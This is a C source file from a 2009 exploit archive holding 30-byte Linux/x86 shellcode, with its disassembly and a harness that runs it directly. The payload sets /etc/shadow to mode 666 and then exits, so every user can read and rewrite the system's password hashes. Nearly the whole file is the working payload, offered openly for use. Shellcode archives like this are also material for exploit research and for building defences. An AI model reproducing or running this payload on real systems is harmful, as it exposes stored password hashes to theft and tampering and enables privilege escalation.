/*
   Linux/x86 - chmod("/etc/shadow",666) & exit(0)

	Info reg
        ------------------
   	%eax = 15
   	%ebx = /etc/shadow
   	%ecx = 666

        %eax = 1
        %ebx = 0

   Shellcode 30 bytes
   Author: Jonathan Salwan < submit [AT] shell-storm.org >
   Web: http://www.shell-storm.org

 Disassembly of section .text:

 08048054 <.text>:
 8048054:	51                   	push   %ecx
 8048055:	66 b9 b6 01          	mov    $0x1b6,%cx
 8048059:	68 61 64 6f 77       	push   $0x776f6461
 804805e:	68 63 2f 73 68       	push   $0x68732f63
 8048063:	68 2f 2f 65 74       	push   $0x74652f2f
 8048068:	89 e3                	mov    %esp,%ebx
 804806a:	6a 0f                	push   $0xf
 804806c:	58                   	pop    %eax
 804806d:	cd 80                	int    $0x80
 804806f:	40                   	inc    %eax
 8048070:	cd 80                	int    $0x80

*/

#include "stdio.h"

int main(int argc, char *argv[])
{

	char shellcode[] = 	"\x51\x66\xb9\xb6"
				"\x01\x68\x61\x64"
				"\x6f\x77\x68\x63"  // chmod("/etc/shadow",666)
				"\x2f\x73\x68\x68"
				"\x2f\x2f\x65\x74"
				"\x89\xe3\x6a\x0f"
				"\x58\xcd\x80"

				"\x40\xcd\x80";     // exit(0);

	printf("Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();

	return 0;
}

// milw0rm.com [2009-02-20]